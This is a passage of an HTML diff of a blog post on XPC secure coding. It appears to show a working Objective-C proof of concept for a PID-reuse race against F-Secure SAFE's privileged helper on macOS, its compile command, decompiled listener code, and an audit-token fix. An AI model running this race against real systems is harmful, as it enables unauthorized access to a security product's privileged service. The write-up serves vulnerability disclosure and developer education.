+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setSubscription:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">key:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg4</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">resumeTime:</span>(<span style="color:#078;font-weight:bold">double</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg4</span>;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> main(<span style="color:#078;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#099">#define RACE_COUNT 10
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#099">#define kValid &#34;/Applications/F-Secure/Support Tool.app/Contents/MacOS/Support Tool&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#069;font-weight:bold">extern</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>environ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">int</span> pids[RACE_COUNT];
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">int</span> pid <span style="color:#555">=</span> fork();
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (pid <span style="color:#555">==</span> <span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
+</span></span><span style="display:flex;"><span>        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
+</span></span><span style="display:flex;"><span>        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(fscsafeadmindProtocol)]];
+</span></span><span style="display:flex;"><span>        [_agentConnection resume];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">id</span> obj <span style="color:#555">=</span> [_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error)
+</span></span><span style="display:flex;"><span>         {
+</span></span><span style="display:flex;"><span>             (<span style="color:#078;font-weight:bold">void</span>)error;
+</span></span><span style="display:flex;"><span>             NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
+</span></span><span style="display:flex;"><span>         }];
+</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;obj: %@&#34;</span>, obj);
+</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;conn: %@&#34;</span>, _agentConnection);
+</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//get FW state
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        [obj <span style="color:#99f">getFirewallState</span>:<span style="color:#555">^</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span> b){
+</span></span><span style="display:flex;"><span>             NSLog(<span style="color:#c30">@&#34;Response: %llx&#34;</span>,b);
+</span></span><span style="display:flex;"><span>                 }];
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;Done&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">char</span> target_binary[] <span style="color:#555">=</span> kValid;
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>target_argv[] <span style="color:#555">=</span> {target_binary, <span style="color:#366">NULL</span>};
+</span></span><span style="display:flex;"><span>        posix_spawnattr_t attr;
+</span></span><span style="display:flex;"><span>        posix_spawnattr_init(<span style="color:#555">&amp;</span>attr);
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">short</span> flags;
+</span></span><span style="display:flex;"><span>        posix_spawnattr_getflags(<span style="color:#555">&amp;</span>attr, <span style="color:#555">&amp;</span>flags);
+</span></span><span style="display:flex;"><span>        flags <span style="color:#555">|=</span> (POSIX_SPAWN_SETEXEC <span style="color:#555">|</span> POSIX_SPAWN_START_SUSPENDED);
+</span></span><span style="display:flex;"><span>        posix_spawnattr_setflags(<span style="color:#555">&amp;</span>attr, flags);
+</span></span><span style="display:flex;"><span>        posix_spawn(<span style="color:#366">NULL</span>, target_binary, <span style="color:#366">NULL</span>, <span style="color:#555">&amp;</span>attr, target_argv, environ);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;forked %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>        pids[i] <span style="color:#555">=</span> pid;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// keep the children alive
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    sleep(<span style="color:#f60">10</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#99f">cleanup</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        pids[i] <span style="color:#555">&amp;&amp;</span> kill(pids[i], <span style="color:#f60">9</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We compile the code with:</p>
 <pre tabindex="0"><code>gcc -framework Foundation -framework Security fsecurepid.m -o fsecurepid
 </code></pre><p>If we run it, we can see that the <code>fscsafeadmind</code> process will accept the connecting PID.</p>
 <p><img src="https://theevilbit.github.io/images/Secure_coding_XPC_Part5/f-secure_accept1.png" alt=""></p>
 <p>This is from this code:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#09f;font-style:italic">/* @class FCSServiceDelegate */</span>
--(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#c0f">listener:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">shouldAcceptNewConnection:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
-(...)
-<span style="color:#99f">loc_100012e26</span>:
-    r12 <span style="color:#555">=</span> <span style="color:#555">*</span>_objc_msgSend;
-    NSLog(<span style="color:#c30">@&#34;%@: Accepting client pid %d&#34;</span>, r13, rbx);
-    rax <span style="color:#555">=</span> [r13 serviceProtocol];
-</code></pre></div><p>We can also see the requests:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class FCSServiceDelegate */</span>
+</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#c0f">listener:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">shouldAcceptNewConnection:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
+</span></span><span style="display:flex;"><span>(...)
+</span></span><span style="display:flex;"><span><span style="color:#99f">loc_100012e26</span>:
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> <span style="color:#555">*</span>_objc_msgSend;
+</span></span><span style="display:flex;"><span>    NSLog(<span style="color:#c30">@&#34;%@: Accepting client pid %d&#34;</span>, r13, rbx);
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [r13 serviceProtocol];
+</span></span></code></pre></div><p>We can also see the requests:</p>
 <p><img src="https://theevilbit.github.io/images/Secure_coding_XPC_Part5/f-secure_accept2.png" alt=""></p>
 <p>Another way to exploit it is using Ian Beer&rsquo;s technique, which can be read further down below.</p>
 <p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1223">https://bugs.chromium.org/p/project-zero/issues/detail?id=1223</a></p>
@@ -274,27 +274,27 @@ The root cause The XPC services of F-Secure SAFE use the process ID (PID) to ver
 <p>Patrick Wardle has a solution how to still use this, documented in his blog post:
 <a href="https://objective-see.com/blog.html#blogEntry7">Objective-See</a></p>
 <p>Essentially we need to create an extended class for <code>NSXPCConnection</code>, and in the <code>shouldAcceptNewConnection</code> callback we simply typecast the connection to this class, and we will be able to access the audit token.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span> : <span style="color:#0a8;font-weight:bold">NSXPCConnection</span>
-{
-   audit_token_t auditToken;
-}
-<span style="color:#069;font-weight:bold">@property</span> audit_token_t auditToken;
-<span style="color:#069;font-weight:bold">@end</span>
-
-<span style="color:#069;font-weight:bold">@implementation</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span>
-
-   <span style="color:#069;font-weight:bold">@synthesize</span> auditToken;
-
-<span style="color:#069;font-weight:bold">@end</span>
-
-(...)
-<span style="color:#555">-</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#99f">listener</span>:(NSXPCListener <span style="color:#555">*</span>)listener <span style="color:#99f">shouldAcceptNewConnection</span>:(NSXPCConnection <span style="color:#555">*</span>)newConnection
-{
-(...)
-    auditToken <span style="color:#555">=</span> ((ExtendedNSXPCConnection<span style="color:#555">*</span>)newConnection).auditToken;
-(...)
-}
-</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span> : <span style="color:#0a8;font-weight:bold">NSXPCConnection</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>   audit_token_t auditToken;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span> audit_token_t auditToken;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@implementation</span> <span style="color:#0a8;font-weight:bold">ExtendedNSXPCConnection</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">@synthesize</span> auditToken;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(...)
+</span></span><span style="display:flex;"><span><span style="color:#555">-</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#99f">listener</span>:(NSXPCListener <span style="color:#555">*</span>)listener <span style="color:#99f">shouldAcceptNewConnection</span>:(NSXPCConnection <span style="color:#555">*</span>)newConnection
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>(...)
+</span></span><span style="display:flex;"><span>    auditToken <span style="color:#555">=</span> ((ExtendedNSXPCConnection<span style="color:#555">*</span>)newConnection).auditToken;
+</span></span><span style="display:flex;"><span>(...)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>This concludes my series I planned in XPC exploitation and secure coding, I hope these posts find their way to developers, as in my experience most of the applications are not done right. Unfortunately the only one to blame for this is Apple, as they don&rsquo;t provide clear best practices for developers, neither secure public APIs. I hope this will change in the future.</p>
 <h2 id="further-resources">Further resources</h2>
 <p>If you are interested reading more about XPC attacks I recommend four talks:</p>
